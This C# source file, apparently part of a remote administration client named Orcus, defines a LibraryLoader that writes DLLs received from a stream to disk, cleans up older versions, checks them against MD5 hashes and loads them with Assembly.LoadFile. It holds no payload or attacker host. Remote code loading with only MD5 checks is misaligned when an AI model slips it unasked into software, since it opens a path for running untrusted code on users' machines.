using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Orcus.Config;
using Orcus.Shared.Connection;
using Orcus.Shared.Utilities;

namespace Orcus.Core
{
    public class LibraryLoader
    {
        private static LibraryLoader _current;

        public LibraryLoader()
        {
            CleanupLibraries();
        }

        public static LibraryLoader Current => _current ?? (_current = new LibraryLoader());

        public PortableLibrary LoadedLibraries { get; private set; } = PortableLibrary.None;

        public void LoadLibrary(PortableLibrary portableLibrary, Stream sourceStream, int length)
        {
            var path = GetLibraryPath(portableLibrary);
            using (var fileStream = new FileStream(path, FileMode.CreateNew, FileAccess.Write))
                sourceStream.CopyToEx(fileStream, length); //explicit really important, else the FW version of CopyTo will be used -> fucking error in 1.8

            LoadLibrary(path, portableLibrary);
        }

        private static void CleanupLibraries()
        {
            var libraryDirectory = new DirectoryInfo(Consts.LibrariesDirectory);
            if (!libraryDirectory.Exists)
                return;

            var regex = new Regex("^(?<name>(.+?))(_(?<number>([0-9]{1,2})))?\\.dll");
            var regexMatches =
                libraryDirectory.GetFiles("*.dll", SearchOption.TopDirectoryOnly)
                    .Select(x => new PortableLibraryMatch(regex.Match(x.Name), x));

            foreach (var libraryFile in regexMatches.GroupBy(x => x.Match.Groups["name"].Value))
            {
                var otherFiles = libraryFile.ToList();
                //only clear name
                if (otherFiles.Count == 1 && string.IsNullOrEmpty(otherFiles[0].Match.Groups["number"].Value))
                    return;

                var superiorFile =
                    otherFiles.Where(x => !string.IsNullOrEmpty(x.Match.Groups["number"].Value))
                        .OrderByDescending(x => int.Parse(x.Match.Groups["number"].Value)).First();

                foreach (var fileMatch in otherFiles.Where(x => x != superiorFile))
                {
                    try
                    {
                        fileMatch.FileInfo.Delete();
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                var rootFile =
                    new FileInfo(Path.Combine(Consts.LibrariesDirectory,
                        superiorFile.Match.Groups["name"].Value + ".dll"));

                if (!rootFile.Exists)
                    try
                    {
                        superiorFile.FileInfo.MoveTo(rootFile.FullName);
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
            }
        }

        private static string GetLibraryPath(PortableLibrary library)
        {
            var libraryName = GetFilenameByLibrary(library);

            var libraryDirectory = new DirectoryInfo(Consts.LibrariesDirectory);
            if (!libraryDirectory.Exists)
            {
                libraryDirectory.Create();
                return Path.Combine(libraryDirectory.FullName, libraryName);
            }

            var libraryNameWithoutExtension = Path.GetFileNameWithoutExtension(libraryName);

            var regex = new Regex("^" + libraryNameWithoutExtension + "(_(?<number>([0-9]{1,2})))?\\.dll");

            var existingLibraries =
                libraryDirectory.GetFiles(libraryNameWithoutExtension + "*.dll", SearchOption.TopDirectoryOnly)
                    .Select(x => new PortableLibraryMatch(regex.Match(x.Name), x)).ToList();

            if (existingLibraries.Count > 0)
            {
                //remove unused libraries
                for (int j = existingLibraries.Count - 1; j >= 0; j--)
                {
                    try
                    {
                        existingLibraries[j].FileInfo.Delete();
                        existingLibraries.RemoveAt(j);
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                var rootFile = new FileInfo(Path.Combine(Consts.LibrariesDirectory, libraryName));
                if (!rootFile.Exists)
                    return rootFile.FullName;
                else
                {
                    var highestNumber =
                        existingLibraries.Where(x => !string.IsNullOrEmpty(x.Match.Groups["number"].Value))
                            .Select(x => int.Parse(x.Match.Groups["number"].Value))
                            .OrderByDescending(x => x)
                            .First();
                    highestNumber++;
                    return Path.Combine(Consts.LibrariesDirectory, libraryNameWithoutExtension + "_" + highestNumber + ".dll");
                }
            }

            return Path.Combine(Consts.LibrariesDirectory, libraryName);
        }

        public PortableLibrary CheckLibraries(PortableLibrary libraries, List<byte[]> hashes)
        {
            var libraryDirectory = new DirectoryInfo(Consts.LibrariesDirectory);
            if (!libraryDirectory.Exists)
                return libraries;

            var missingLibraries = PortableLibrary.None;
            var libraryList = libraries.GetUniqueFlags<PortableLibrary>().Where(x => x != 0).ToList();

            var regex = new Regex("^(?<name>(.+?))(_(?<number>([0-9]{1,2})))?\\.dll");
            var regexMatches =
                libraryDirectory.GetFiles("*.dll", SearchOption.TopDirectoryOnly)
                    .Select(x => new PortableLibraryMatch(regex.Match(x.Name), x)).ToList();

            using (var md5 = new MD5CryptoServiceProvider())
                for (int i = 0; i < libraryList.Count; i++)
                {
                    var library = libraryList[i];
                    var libraryName = GetFilenameByLibrary(library);
                    var existingLibraries = regexMatches.Where(x => x.Match.Groups["name"].Value + ".dll" == libraryName).ToList();

                    if (existingLibraries.Count > 0)
                    {
                        string libraryPath;

                        //that might be the root library
                        if (existingLibraries.Count == 1)
                            libraryPath = existingLibraries[0].FileInfo.FullName;
                        else
                        {
                            //search in the numbered libraries the latest (= highest number)
                            libraryPath =
                                existingLibraries.Where(x => !string.IsNullOrEmpty(x.Match.Groups["number"].Value))
                                    .OrderByDescending(x => int.Parse(x.Match.Groups["number"].Value))
                                    .First()
                                    .FileInfo.FullName;
                        }

                        using (var fileStream = new FileStream(libraryPath, FileMode.Open, FileAccess.Read))
                        {
                            var hash = md5.ComputeHash(fileStream);
                            if (hash.SequenceEqual(hashes[i]))
                            {
                                try
                                {
                                    LoadLibrary(libraryPath, library);
                                    continue; //exists
                                }
                                catch (Exception)
                                {
                                    // ignored
                                }
                            }
                        }
                    }

                    missingLibraries |= libraryList[i];
                }

            return missingLibraries;
        }

        private void LoadLibrary(string path, PortableLibrary library)
        {
            LoadedLibraries |= library;
            Assembly.LoadFile(path);
        }

        private static string GetFilenameByLibrary(PortableLibrary library)
        {
            return library.GetAttributeOfType<PortableLibraryNameAttribute>()?.Name;
        }

        private class PortableLibraryMatch
        {
            public PortableLibraryMatch(Match match, FileInfo fileInfo)
            {
                Match = match;
                FileInfo = fileInfo;
            }

            public Match Match { get; }
            public FileInfo FileInfo { get; }
        }
    }
}